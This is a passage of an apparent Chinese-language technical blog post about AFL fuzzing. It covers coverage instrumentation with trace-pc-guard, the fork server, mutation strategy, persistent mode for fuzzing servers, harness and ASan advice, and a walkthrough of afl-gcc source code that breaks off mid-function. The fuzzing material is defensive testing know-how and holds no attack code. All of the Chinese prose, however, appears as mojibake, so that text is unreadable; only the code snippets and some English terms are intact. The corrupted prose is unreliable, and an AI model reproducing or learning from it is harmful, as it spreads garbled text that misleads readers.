æ­¤Sakuraå¸ˆå‚…å¯¹å…¶è¿›è¡Œäº†æ›¿æ¢ï¼š</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span>* start, <span class="type">uint32_t</span>* stop) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> N = <span class="number">0</span> ;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;@sakura in __sanitizer_cov_trace_pc_guard_init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(start == stop || *start) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint32* x = start ; x &lt; stop ; x++)&#123;</span><br><span class="line">        *x = (++N) % MAP_SIZE;<span class="comment">//mod map_sizeï¼ˆ1 &lt;&lt; 16 == 65536ï¼‰</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;@sakura there are %u guards in total\n&quot;</span>,N);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æƒ³å¯¹æ¯æ¡edgeè¿›è¡Œæ’æ¡©ï¼Œéœ€è¦å…ˆåœ¨make aflæ—¶ä¼ å…¥AFL_TRACE_PC&#x3D;1æ¥å®šä¹‰DUSE_TRACE_PCå®ï¼ˆ<code>make AFL_TRACE_PC=1</code>ï¼‰ï¼Œç„¶ååœ¨æ‰§è¡Œafl-clang-fastçš„æ—¶å€™ä¼ å…¥<code>-fsanitize-coverage=trace-pc-guard</code>å‚æ•°å³å¯ã€‚æ­£å¸¸makeä¼šå¯ç”¨<code>afl-llvm-pass</code>è€Œé<code>afl-llvm-rt</code></p></li><li><p>GCOVã€LCOV</p><p>è¦†ç›–ç‡è®°å½•çš„å®ç°é™¤äº†å‰ä¸¤ç§æ–¹å¼ä¹‹å¤–è¿˜å¯ä»¥ä½¿ç”¨GCOVã€LCOVè¿™ä¸¤ä¸ªä¸œè¥¿å¯è§†åŒ–å±•ç¤ºä»£ç è¦†ç›–ç‡ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨åˆ°fuzzerä¸Šã€‚</p></li></ol><p><strong>ä¸€äº›fuzzçš„è¦†ç›–ç‡åé¦ˆå’Œå¼•å¯¼å˜å¼‚çš„ä¸€äº›æ¦‚å¿µï¼š</strong></p><p>fuzzæœ‰<code>ç”Ÿæˆå¼fuzz</code>å’Œ<code>å˜å¼‚å¼fuzz</code>ä¸¤ç§ï¼Œç”Ÿæˆå¼fuzzå°±æ˜¯ä¸€å¼€å§‹ä»€ä¹ˆç§å­ä¹Ÿæ²¡æœ‰ï¼Œçº¯æ ¹æ®fuzzerçš„é€»è¾‘æ¥ç”Ÿæˆç§å­ï¼ˆè¾“å…¥ï¼‰ï¼Œfuzzè¿‡ç¨‹ä¸­æ²¡æœ‰ä»»ä½•çš„åé¦ˆï¼Œä¹Ÿä¸ä¼šæ ¹æ®æŸæ—¶æŸåˆ»çš„ä»£ç è¦†ç›–ç‡æ¥æŠŠinteresting caseå˜å¼‚å‘ç°æ–°çš„è·¯å¾„ã€‚ AFLé‡‡ç”¨çš„æ˜¯å˜å¼‚å¼fuzz</p><p>è¿›è¡Œfuzzæ—¶ï¼Œå¯¹æ ·æœ¬è¿›è¡Œå˜å¼‚ï¼Œç„¶ååœ¨æ‰¾åˆ°æ–°çš„è·¯å¾„æ—¶ï¼Œå°†å½“å‰å˜å¼‚åæ•°æ®å½“æˆä¸€ä¸ªæ–°çš„æ ·æœ¬ç»§ç»­å˜å¼‚ã€‚ç»è¿‡é€ä»£çš„å˜å¼‚æ‚äº¤é€‰ä¼˜ï¼Œç›´åˆ°è¾¾åˆ°ä¸€ä¸ªå±€éƒ¨æœ€ä¼˜è§£ä¸ºæ­¢ï¼ˆå·²å‘ç°çš„è·¯å¾„è¾¾åˆ°maxï¼‰ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„**<font style="color:#E8323C;">é—ä¼ ç®—æ³•</font>**ã€‚</p><p>å› ä¸ºé—ä¼ ç®—æ³•çš„ç‰¹å¾æ€»æ˜¯æ¥è‡ªäº<strong>åˆå§‹ç§å­æ ·æœ¬</strong>å’Œ<strong>å˜å¼‚ç­–ç•¥</strong>ï¼Œæ‰€ä»¥æ”¹è¿›ä¹Ÿä¸»è¦åœ¨è¿™ä¸¤æ–¹é¢ã€‚ç§å­ä¹Ÿå¯ä»¥æ˜¯ä¸€äº›ä»£ç è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cyberangel;</span><br></pre></td></tr></table></figure><p>å¦‚æœå˜å¼‚å™¨ä¸ä¼šå¼•å…¥æ–°çš„tokenï¼ˆç‰¹å¾ï¼‰ï¼Œé‚£æ°¸è¿œå°±åªä¼šç”Ÿæˆselectè¿™ä¸€ç§ç‰¹å¾ï¼Œè€Œä¸ä¼šç”Ÿæˆå¦‚SQLè¯­å¥ä¸­çš„insertã€deleteç­‰ã€‚æ‰€ä»¥ç§å­çš„å˜å¼‚ç­–ç•¥ä¹Ÿååˆ†çš„é‡è¦ï¼Œå®ƒæå¤§çš„å½±å“ç€fuzzçš„ä»£ç è¦†ç›–ç‡ã€‚</p><p>é™¤äº†å¯¹ç§å­çš„ä¸æ–­å˜å¼‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦äº†è§£AFLå¦‚ä½•å°†è‡ªåŠ¨æˆ–åŠè‡ªåŠ¨ç”Ÿæˆçš„éšæœºæ•°æ®è¾“å…¥åˆ°è¢«fuzzerçš„ç¨‹åºä¸­å¹¶ç›‘è§†å¦‚å´©æºƒï¼Œæ–­è¨€ï¼ˆassertionï¼‰ç­‰ç¨‹åºå¼‚å¸¸è¿™ä¸ªè¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œè¾“å…¥å’Œæ•è·crashã€‚AFLé‡‡ç”¨çš„æ˜¯<code>fork server</code>è¿™ç§æœºåˆ¶ï¼Œå…·ä½“æ–¹å¼å¦‚ä¸‹ï¼š</p><ol><li>fuzzerå˜å¼‚ç”Ÿæˆæ–°æ ·æœ¬åä¼šå°†å®ƒä»¬å†™å…¥åˆ°æ‰§è¡Œæ–‡ä»¶ç›®å½•çš„.cur_inputéšè—æ–‡ä»¶å¤¹ä¸­</li><li>afl-fuzzä¼šforkå‡ºä¸€ä¸ªå­è¿›ç¨‹ä½œä¸ºfork serverï¼Œç„¶åfuzzeré€šè¿‡ç®¡é“å‘é€4å­—èŠ‚æ•°æ®é€šçŸ¥fork serverå»forkä¸€ä¸ªè¿›ç¨‹æ¥æµ‹è¯•ã€‚</li><li>æ— è®ºè¢«fuzzçš„è¿›ç¨‹ç»“æœå¦‚ä½•ï¼Œfork serveréƒ½ä¼šé€šè¿‡ç®¡é“è¿”å›å­è¿›ç¨‹çš„æ‰§è¡Œç»“æœåˆ°afl-fuzz</li><li>afl-fuzzæ ¹æ®æµ‹è¯•ç”Ÿæˆçš„è¦†ç›–ç‡ä¿¡æ¯æ¥å¼•å¯¼åç»­çš„æµ‹è¯•</li></ol><blockquote><p>è¿›ç¨‹å…³ç³»ï¼šfuzzerè¿›ç¨‹ -&gt; fork server -&gt; è¢«fuzzçš„ç¨‹åº</p></blockquote><p>å¸¸ç”¨çš„AFLé­”æ”¹æŠ€å·§æœ‰å“ªäº›ï¼Ÿ</p><ul><li>å› ä¸ºAFLä¸­æœ‰è¦†ç›–ç‡åé¦ˆå’Œcrashæ•è·çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥æ›¿æ¢AFLåŸæœ¬çš„mutateã€å˜å¼‚å™¨ã€‘ä¸ºè‡ªå·±çš„ä»£ç ï¼Œè¯´ç™½äº†å°±æ˜¯å€Ÿäº†AFLçš„ä¸€ä¸ªå£³ã€‚</li><li>åœ¨å†™å…¥testcaseä¹‹å‰å¯ä»¥å¯¹å†™å…¥çš„å†…å®¹è¿›è¡Œå°è£…å’Œæ˜ å°„ï¼Œafl-fuzzçš„è¿™éƒ¨åˆ†åŸæœ¬çš„ä»£ç å¦‚ä¸‹ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write modified data to file for testing. If out_file is set, the old file</span></span><br><span class="line"><span class="comment">   is unlinked and a new one is created. Otherwise, out_fd is rewound and</span></span><br><span class="line"><span class="comment">   truncated. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">write_to_testcase</span><span class="params">(<span class="type">void</span>* mem, u32 len)</span> &#123;</span><br><span class="line"></span><br><span class="line">  s32 fd = out_fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line"></span><br><span class="line">    unlink(out_file); <span class="comment">/* Ignore errors. */</span></span><br><span class="line"></span><br><span class="line">    fd = open(out_file, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  ck_write(fd, mem, len, out_file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!out_file) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ftruncate(fd, len)) PFATAL(<span class="string">&quot;ftruncate() failed&quot;</span>);</span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>write_to_testcase</code>å‡½æ•°ä¼šå°†å˜å¼‚ç”Ÿæˆçš„æ–°æ ·æœ¬å†™å…¥åˆ°<code>.cur_input</code>éšè—æ–‡ä»¶å¤¹ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ–‡ä»¶å†™å…¥ä¹‹å‰å¯ä»¥åœ¨å¤–é¢å¥—ä¸Šä¸€å±‚å‡½æ•°ä»¥ä¾¿è®©AFLçš„åŸå§‹å­—èŠ‚ç çš„å˜å¼‚é€‚ç”¨äºæ›´å¤šçš„åœºæ™¯ã€‚afl-fuzzé€‚åˆåŸºäºå­—èŠ‚ç²’åº¦å˜å¼‚çš„fuzzï¼ˆå¦‚fuzzä¸€ä¸ªç®€å•çš„è¾“å…¥è¾“å‡ºç¨‹åºï¼‰ï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰ç›®æ ‡éƒ½å¯ä»¥ç›´æ¥è¿›è¡Œå­—èŠ‚ç²’åº¦çš„fuzzã€‚æœ‰äº›æ˜¯å› ä¸ºæ–‡ä»¶è§£æéƒ¨åˆ†çš„ä»£ç ä¸èƒ½å•ç‹¬æŠ½å‡ºæ¥ï¼Œæœ‰äº›æ˜¯å› ä¸ºæ–‡ä»¶è§£æä»…ä»…æ˜¯é€»è¾‘çš„å¼€å§‹ã€‚é‚£ä¹ˆä¸ºå˜å¼‚å™¨åŠ å±‚å°±æ˜¯åœ¨è¿™æ–¹é¢æ‰©å±•afl-fuzzçš„æœ€ç®€å•æ–¹æ³•ï¼Œæœ€ç»å…¸çš„ä¾‹å­å¦‚<code>webassembly</code>ã€‚</p><p>ä¸ºäº†fuzzè¿™äº›ç»“æ„åŒ–çš„ä¸œè¥¿ï¼ˆç±»ä¼¼SQLï¼‰æˆ‘ä»¬éœ€è¦è¿›è¡Œ<code>ç»“æ„æ„ŸçŸ¥ï¼ˆstructure-awareï¼‰</code>ï¼Œå³é’ˆå¯¹ç‰¹å®šè¾“å…¥ç±»å‹çš„è¯­æ³•è¿›è¡Œæ„ŸçŸ¥</p><p><strong>å¦‚ä½•ä½¿ç”¨AFL fuzz client-serveræ¨¡å¼çš„ç¨‹åºï¼Œæˆ–è€…å¦‚ä½•ä½¿ç”¨AFLå»fuzzç½‘ç»œåè®®å‘¢ï¼Ÿ</strong></p><p>lient-serveræ¨¡å¼ä¸­çš„client -&gt; serverå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client ---&gt; server()&#123;</span><br><span class="line">    æ¥æ”¶åŒ…();</span><br><span class="line">    å¤„ç†åŒ…();</span><br><span class="line">    è¿”å›å“åº”åŒ…();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç¯‡æ–‡ç« å€¼å¾—å‚è€ƒï¼š<a href="https://www.fastly.com/blog/how-fuzz-server-american-fuzzy-lop">https://www.fastly.com/blog/how-fuzz-server-american-fuzzy-lop</a></p><p>æ–‡ç« ä¸­æåˆ°ä¸€ä¸ªä¸º<code>Persistent modeï¼ˆæŒä¹…æ¨¡å¼ï¼‰</code>çš„æ¦‚å¿µï¼Œå¦‚æœè¦å‘AFLé›†æˆè¿™ç§åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æµç¨‹ç¼–å†™è‡ªå·±çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (go)<span class="comment">//while loop</span></span><br><span class="line">    put_request(read(file)) <span class="comment">//å°†clientè¦å‘é€çš„è¯·æ±‚åŒ…å†™å…¥åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line">    req = get_request()<span class="comment">//å¹¶è®©æœåŠ¡ç«¯ä»æ–‡ä»¶ä¸­è·å–è¯·æ±‚</span></span><br><span class="line">    process(req)<span class="comment">//æœåŠ¡ç«¯å¤„ç†è¯·æ±‚</span></span><br><span class="line">    notify_fuzzer() <span class="comment">//é€šçŸ¥fuzzerï¼ˆAFLï¼‰</span></span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•éœ€è¦ç”¨aflç›´æ¥å¯åŠ¨serverç¨‹åºï¼Œpatch serverç¨‹åºæ¥æ”¶è¯·æ±‚åŒ…çš„ä»£ç ï¼Œæ”¹ä¸ºç›´æ¥ä»æ ‡å‡†è¾“å…¥é‡Œè¯»å–ï¼Œserveræ‰§è¡Œè¶³å¤Ÿå¤šæ¬¡è¯·æ±‚åé€€å‡ºï¼ŒAFLå†å¯åŠ¨ä¸€ä¸ªæ–°çš„serverå†æ¬¡fuzzã€‚</p><p><strong>fuzzè¦çœŸæ­£è§£å†³çš„é—®é¢˜å’Œä¸€äº›Sakuraå¸ˆå‚…çš„å»ºè®®</strong></p><ul><li>è¦å¯¹æŸä¸€ä¸ªé¡¹ç›®è¿›è¡Œfuzzå°±è¦é¦–å…ˆè€ƒè™‘å¦‚ä½•å°†é¡¹ç›®è·‘èµ·æ¥ï¼Œå¦‚ä½•åœ¨æ’æ¡©å’Œasanä¹‹åè·‘èµ·æ¥ã€‚æ‰€ä»¥è¦å…ˆå­¦ä¼šMakefileå’ŒCMakeï¼Œå¿…è¦æ—¶è¦å­¦ä¼šä½¿ç”¨unicornã€qilingç­‰å›ºä»¶ä»¿çœŸå·¥å…·è¿›è¡Œæ¨¡æ‹Ÿè¿è¡Œã€‚</li></ul><blockquote><p>Address SanitizeråˆåASanï¼Œæ˜¯ä¸€ä¸ªå¿«é€Ÿçš„C&#x2F;C++å†…å­˜é”™è¯¯æ£€æŸ¥å™¨ã€‚å®ƒå¯ä»¥æ£€æµ‹åˆ°ï¼šUAFã€Heap buffer overflowã€Stack buffer overflowã€Global buffer overflowã€Use after returnã€Use after scpoeã€Initialization order bugsã€Memory leakç­‰æ¼æ´ç±»å‹ã€‚asanå¯ä»¥ç®€å•ç†è§£æˆå¯¹mallocå’Œfreeä»¥åŠå­˜å–æŒ‡ä»¤ç­‰çš„hookï¼Œä»è€Œåœ¨å‘ç°åˆ†é…å‡ºæ¥çš„å†…å­˜çš„å¤§å°ï¼Œå°äºè¦å­˜å–çš„indexçš„å¤§å°æ—¶ï¼Œæ£€æµ‹å‡ºè¶Šç•Œè¯»å†™é—®é¢˜ã€‚</p></blockquote><ul><li><p>è¦ç†è§£è¢«æµ‹è¯•ç¨‹åºçš„ä»£ç ï¼Œå¹¶ä¸æ˜¯è¯´éšä¾¿æ‹¿åˆ°ä¸€ä¸ªç¨‹åºæ‹¿fuzzè·‘èµ·æ¥æ˜¯æœ‰æ„ä¹‰çš„ï¼Œä¾‹å¦‚ä¼ å…¥æ•°æ®çš„parserï¼ˆè§£æå™¨ã€è¯­æ³•åˆ†æå™¨ï¼‰ï¼Œå¿…è¦æ—¶é€šè¿‡é€†å‘æ¥å•ç‹¬å–å‡ºä¸€éƒ¨åˆ†ä»£ç æ¥æµ‹è¯•åŠŸèƒ½ã€‚æ¯”å¦‚Windowsçš„media playerï¼Œè¿™æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–çš„åº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡å‘½ä»¤è¡Œçª—å£æ¥å¯¹è¯¥ç¨‹åºè¿›è¡Œæµç¨‹çš„æ§åˆ¶ä¸è¾“å…¥ï¼Œä½†æ˜¯è¿™äº›åŠŸèƒ½çš„å®ç°è‚¯å®šéƒ½æ˜¯å­˜åœ¨äºæŸä¸€ä¸ªdllï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ä¸­çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨dlopenå‡½æ•°å†™harnessæ¥åŠ è½½dllï¼š</p><blockquote><p>harnessä½œç”¨ï¼šå¦‚æœæˆ‘ä»¬æƒ³fuzz dll (åŠ è½½çš„åº“)ä¸­çš„å‡½æ•°è¾“å…¥ï¼Œå› ä¸ºæ²¡æœ‰å®šä¹‰å…¥å£ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ç¼–å†™æµ‹è¯•å·¥å…·æ¥å°†è¾“å…¥ä»å‘½ä»¤è¡Œä¼ é€’åˆ° DLL å‡½æ•°ã€‚</p></blockquote></li><li><p>å–„äºæ ¹æ®åœºæ™¯æ”¹è¿›fuzzï¼Œä»¥å°†åªç”¨ä¸æ–‡ä»¶æ ¼å¼fuzzçš„AFLåˆ©ç”¨åŠ å±‚æˆ–æ˜ å°„è®©å…¶æ‰©å±•åˆ°æ›´å¤šçš„åœºæ™¯ä¸­ï¼Œå®ç°è‡ªå·±çš„è‡ªå®šä¹‰ç¼–è¯‘ã€‚</p></li><li><p>æ ¹æ®ä¸åŒçš„ç›®æ ‡æŒæ¡ä¸åŒçš„çŸ¥è¯†ï¼Œæ‰¾åˆ°ä¸»æµä½¿ç”¨çš„fuzzerå¹¶è¿›è¡Œæ”¹è¿›</p><ul><li>js fuzzéœ€è¦æŒæ¡ç¼–è¯‘åŸç†ï¼Œç†è§£æ–‡æ³•</li><li>å†…æ ¸fuzzéœ€è¦æŒæ¡å†…æ ¸çŸ¥è¯†å’Œé©±åŠ¨ç›’ç¼–å†™ï¼Œç†è§£å¦‚ä½•æ„å»ºå’Œç”Ÿæˆæœ‰å…³è”æ€§çš„ç³»ç»Ÿè°ƒç”¨é›†åˆã€‚</li></ul></li><li><p>è‡ªå®šä¹‰æ£€æµ‹å·¥å…·</p></li></ul><blockquote><p>Address SanitizeråˆåASanï¼Œæ˜¯ä¸€ä¸ªå¿«é€Ÿçš„C&#x2F;C++å†…å­˜é”™è¯¯æ£€æŸ¥å™¨ã€‚å®ƒå¯ä»¥æ£€æµ‹åˆ°ï¼šUAFã€Heap buffer overflowã€Stack buffer overflowã€Global buffer overflowã€Use after returnã€Use after scpoeã€Initialization order bugsã€Memory leakç­‰æ¼æ´ç±»å‹ã€‚asanå¯ä»¥ç®€å•ç†è§£æˆå¯¹mallocå’Œfreeä»¥åŠå­˜å–æŒ‡ä»¤ç­‰çš„hookï¼Œä»è€Œåœ¨å‘ç°åˆ†é…å‡ºæ¥çš„å†…å­˜çš„å¤§å°ï¼Œå°äºè¦å­˜å–çš„indexçš„å¤§å°æ—¶ï¼Œæ£€æµ‹å‡ºè¶Šç•Œè¯»å†™é—®é¢˜ã€‚</p></blockquote><p>asanæ˜¯å¯¹mallocã€freeç­‰æŒ‡ä»¤çš„hookï¼Œä½†æ˜¯å¦‚æœåƒjså¼•æ“è¿™ç§ç›´æ¥mmapä¸€å—å¤§å†…å­˜ç„¶åè‡ªå·±æ¥ç®¡ç†å†…å­˜çš„æƒ…å†µï¼Œé‚£ä¹ˆå¦‚ä½•æ£€æµ‹å‡ºæ½œåœ¨çš„è¶Šç•Œè¯»å†™é—®é¢˜å‘¢ï¼Ÿè¿™ç§æ—¶å€™å°±éœ€è¦ç†è§£ä»£ç ï¼Œç„¶åè‡ªå·±å®ç°ä¸€å¥—é’ˆå¯¹æ€§çš„è‡ªå®šä¹‰asanäº†ã€‚</p><h2 id="afl-gccæºç é˜…è¯»"><a href="#afl-gccæºç é˜…è¯»" class="headerlink" title="afl-gccæºç é˜…è¯»"></a>afl-gccæºç é˜…è¯»</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123; <span class="comment">//æ£€æŸ¥stderræ˜¯å¦è¿æ¥/dev/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨find_aså‘½ä»¤ï¼Œargv[0]æ˜¯afl-gccçš„è·¯å¾„</p><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Try to find our &quot;fake&quot; GNU assembler in AFL_PATH or at the location derived</span></span><br><span class="line"><span class="comment">   from argv[0]. If that fails, abort. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 